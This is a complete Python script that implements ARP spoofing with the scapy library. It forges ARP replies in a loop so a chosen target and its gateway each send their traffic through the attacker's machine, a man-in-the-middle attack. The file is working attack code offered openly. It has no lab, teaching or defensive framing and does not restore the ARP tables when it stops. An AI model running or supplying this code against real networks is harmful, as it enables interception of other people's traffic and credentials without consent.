#!/usr/bin/env python3

import time
from scapy.all import ARP, Ether, srp, sendp, get_if_hwaddr, get_if_addr, send
import sys
# import netifaces

class ARPSpoofer:
    def __init__(self, interface, target_ip, gateway_ip):
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.spoofing = False
        self.attacker_mac = get_if_hwaddr(interface)
        self.attacker_ip = get_if_addr(interface)
        
    def get_mac(self, ip):
        '''
        Get the MAC address of the target or gateway
        '''
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast/arp_request
        try:
            answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
            return answered_list[0][1].hwsrc
        except IndexError:
            print(f"[!] Could not get MAC address for {ip}")

    def spoof(self, target_ip, spoof_ip):
        '''
        Send a spoofed ARP packet to the target or gateway
        '''
        target_mac = self.get_mac(target_ip)
        packet = Ether(dst=target_mac, src=self.attacker_mac) / ARP(op=2, 
                                                                   pdst=target_ip, 
                                                                   hwdst=target_mac,
                                                                   psrc=spoof_ip)
        sendp(packet, iface=self.interface)

    def start(self):
        self.spoofing = True
        print(f"[*] Starting ARP spoofing attack...")
        print(f"[*] Target: {self.target_ip}")
        print(f"[*] Gateway: {self.gateway_ip}")
        
        try:
            while self.spoofing:
                # Make the target think we are the gateway
                self.spoof(self.target_ip, self.gateway_ip)
                # Make the gateway think we are the target
                self.spoof(self.gateway_ip, self.target_ip)
                time.sleep(2)
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        print("\n[*] Stopping ARP spoofing attack...")
        self.spoofing = False